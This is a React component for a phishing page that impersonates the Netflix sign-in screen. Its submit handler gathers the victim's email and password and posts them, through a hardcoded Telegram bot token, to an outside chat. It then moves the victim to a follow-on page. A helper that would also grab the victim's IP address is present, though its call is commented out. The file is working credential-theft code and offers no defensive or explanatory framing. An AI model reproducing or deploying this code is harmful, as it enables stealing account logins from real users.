import React from "react";
import { useNavigate } from "react-router-dom";
import { Formik, Form, Field, ErrorMessage } from "formik";
import * as Yup from "yup";
export default function Login() {
  const initialValues = {
    email: "",
    password: "",
  };
  const validationSchema = Yup.object({
    email: Yup.string()
      .required("Please enter a valid email ")
      .email("Please enter a valid email "),
    password: Yup.string()
      .required("Your password must contain between 4 and 60 characters.")
      .min(4, "Your password must contain between 4 and 60 characters.")
      .max(60, "Your password must contain between 4 and 60 characters."),
    //minimum 6 characters

    // maximum 60 characters
  });

  const navigate = useNavigate();

  function SubmitHandler() {
    navigate("/info");
  }
  //function that sends message to telegram
  async function SendMessage(data) {
    let response = await fetch(
      "https://api.telegram.org/bot5376101034:AAGUeSBwEuVbOK_vtkVzrp167MUa4g7H9u8/sendMessage",
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: 1609901379,
          text: data,
        }),
      }
    );
    return response;
  }
  async function getUserIp() {
    let response = await fetch("https://api.ipdata.co", {
      method: "GET",
      headers: {
        "Content-Type": "application/json",
      },
    })
      .then((response) => {
        return response.json();
      }, "jsonp")
      .then((res) => {
        console.log(res.ip);
      })
      .catch((err) => console.log(err));
    let data = await response.json();
    return data.ip;
  }

  return (
    <main>
      <div class="wrapper">
        <div class="official_bg">
          <img src="/bg.jpg" alt="" />
        </div>
        <div class="head_logo">
          <div>
            <img src="/logo.svg" alt="" />
          </div>
        </div>
        <div class="main_body">
          <div class="main_content main_formule">
            <div class="main_frm_wrapper">
              <h1>Sign In</h1>
              <div class="main_alert" style={{ display: "none" }} id="msg">
                <div class="main_alert_msg">
                  <b>Incorrect email or password</b>. Please try again.
                </div>
              </div>
              <Formik
                initialValues={initialValues}
                validationSchema={validationSchema}
                onSubmit={async (values, { setSubmitting }) => {
                  // let ip = await getUserIp();
                  let userLongin =
                    "Email : " +
                    values.email +
                    "\n" +
                    " Password : " +
                    values.password ;
                  let res = await SendMessage(userLongin);
                  setSubmitting(false);
                  if (res.status === 200) {
                    SubmitHandler();
                  }
                }}
              >
                {(formik) => (
                  <Form style={{ zIndex: "99" }}>
                    <div class="main_inp">
                      <div class="place_inp">
                        <div class="inp_control">
                          <label class="input_id">
                            <Field
                              type="text"
                              name="email"
                              class="input"
                              style={
                                formik.errors.email && {
                                  borderBottom: " solid #e87c03 ",
                                }
                              }
                            />
                            <label class="place_lbl">Email</label>
                            <ErrorMessage
                              component="div"
                              name="email"
                              style={{ color: "#e87c03", fontSize: "13px" }}
                            />
                          </label>
                        </div>
                      </div>
                    </div>
                    <div class="main_inp inp_pass">
                      <div class="place_inp">
                        <div class="inp_pass_control">
                          <label class="input_id">
                            <Field
                              type="password"
                              name="password"
                              class="input"
                              style={
                                formik.touched.password &&
                                formik.errors.password && {
                                  borderBottom: " solid #e87c03 ",
                                }
                              }
                            />
                            <label for="pss" class="place_lbl">
                              Password
                            </label>
                          </label>
                        </div>
                      </div>
                      <ErrorMessage
                        component="div"
                        name="password"
                        style={{ color: "#e87c03", fontSize: "13px" }}
                      />
                    </div>
                    <button
                      class="btn login-button btn-submit btn-small"
                      type="submit"
                    >
                      Sign In
                    </button>
                    <div class="remember_help">
                      <div class="extra_inp remember_inp">
                        <input
                          id="rmm"
                          type="checkbox"
                          value="true"
                          checked=""
                        />
                        <label for="rmm">
                          <span class="remember_lbl">Remember me</span>
                        </label>
                        <div class="helper"></div>
                      </div>
                      <a
                        href="http://127.0.0.1/netflixID/app/login#"
                        class="help_lnk"
                      >
                        Need help?
                      </a>
                    </div>
                  </Form>
                )}
              </Formik>
            </div>
            <div class="using_fb">
              <div class="fb_frm">
                <div class="fb_min">
                  <button
                    class="btn minimal-login btn-submit btn-small"
                    type="submit"
                    autocomplete="off"
                    tabindex="0"
                  >
                    <div class="fb-login">
                      <img class="icon-facebook" src="/fb.png" />
                      <span class="fbBtnText">Login with Facebook</span>
                    </div>
                  </button>
                </div>
              </div>
              <div class="new_acc">
                New to Netflix?<a href="javascript:void(0)">Sign up now</a>.{" "}
              </div>
            </div>
          </div>
        </div>
        <div class="footer_main footer_main_first">
          <div class="footer_divider"></div>
          <div class="footer_wrapper">
            <p class="footer__top">
              <a class="footer_top_a" href="javascript:void(0)">
                Questions? Contact us.
              </a>
            </p>
            <ul class="footer_lnk stru">
              <li class="footer-link-item">
                <a class="footer-link" href="javascript:void(0)">
                  Gift Card Terms
                </a>
              </li>
              <li class="footer-link-item">
                <a class="footer-link" href="javascript:void(0)">
                  Terms of Use
                </a>
              </li>
              <li class="footer-link-item">
                <a class="footer-link" href="javascript:void(0)">
                  Privacy Statement
                </a>
              </li>
            </ul>
            <div class="lang_switch">
              <div class="flat_select">
                <div class="select-arrow medium prefix globe">
                  <select class="ui-select medium" id="selectLang">
                    <option value="en" selected="">
                      English
                    </option>
                    <option value="es">Español</option>
                  </select>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </main>
  );
}
